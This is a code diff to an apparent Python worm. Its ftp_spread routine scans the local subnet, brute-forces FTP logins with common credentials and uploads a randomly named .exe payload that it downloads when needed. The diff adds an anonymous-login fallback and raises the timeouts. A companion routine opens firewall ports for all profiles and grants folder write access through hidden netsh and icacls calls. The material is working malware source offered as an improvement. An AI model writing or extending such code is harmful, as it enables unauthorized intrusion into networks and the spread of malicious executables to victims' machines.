@@ -206,16 +206,16 @@ def ftp_spread(common_users, common_pass):
     global PAYLOAD_PATH
     try:
         local_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0]
-        done = False
         for i in range(1, 255):
             ip = f'{local_ip}.{i}'
+            done = False
             for user in common_users:
                 if done: break
                 done = False
                 for pwd in common_pass:
                     try:
-                        print(f"Trying for ip: {ip} with user: {user} pass: {pwd}")
-                        ftp = ftplib.FTP(ip, timeout=1)
+                        print(f"Trying for ip: {ip} with user: {user}, pass: {pwd}")
+                        ftp = ftplib.FTP(ip, timeout=2)
                         ftp.login(user, pwd)
                         random_name = f'{generate_random_name()}.exe'
                         if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
@@ -227,8 +227,22 @@ def ftp_spread(common_users, common_pass):
                         print(f"DONE Sending file for user: {user}, ip: {ip}")
                         done = True
                         break 
-                    except:
-                        continue
+                    except: continue
+            if not done:
+                try:
+                    print(f"Trying for ip: {ip} as anonymous user")
+                    ftp = ftplib.FTP(ip, timeout=2)
+                    ftp.login()
+                    random_name = f'{generate_random_name()}.exe'
+                    if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
+                    else: payload_path = download_payload()
+                    if payload_path:
+                        with open(payload_path, 'rb') as f:
+                            ftp.storbinary(f'STOR {random_name}', f)
+                    ftp.quit()
+                    print(f"DONE Sending file as anonymous user for ip: {ip}") 
+                except: continue
+                
     except:
         pass
 
@@ -317,7 +331,7 @@ def setup_ftp_server(usernames, passwords):
         )
 
         # Create obscure FTP root directory
-        ftp_root = r'C:\ProgramData\SystemFiles\Updates\Resources\ftpdata'
+        ftp_root = r'C:\inetpub\ftproot'
         if not os.path.exists(ftp_root):
             os.makedirs(ftp_root)
 
@@ -377,13 +391,17 @@ def setup_ftp_server(usernames, passwords):
 
         # Add firewall rule for selected port
         subprocess.run(
-            f'netsh advfirewall firewall add rule name="Allow_FTP_{selected_port}" dir=in action=allow protocol=TCP localport={selected_port}',
+            f'netsh advfirewall firewall add rule name="Allow_FTP_{selected_port}" dir=in action=allow protocol=TCP localport={selected_port} profile=any',
             shell=True, capture_output=True, creationflags=0x08000000
         )
 
         subprocess.run(
-            f'netsh advfirewall firewall add rule name="Allow_ICMP" protocol=ICMPv4 dir=in action=allow enable=yes',
+            f'netsh advfirewall firewall add rule name="Allow_ICMP" protocol=ICMPv4 dir=in action=allow enable=yes profile=any',
             shell=True, capture_output=True, creationflags=0x08000000
+        )
+
+        subprocess.run(
+            f'icacls.exe {ftp_root} /grant "IIS_IUSRS:(OI)(CI)(R,W)"', shell=True, capture_output=True, creationflags=0x08000000
         )
 
         # Upload payload to local FTP server
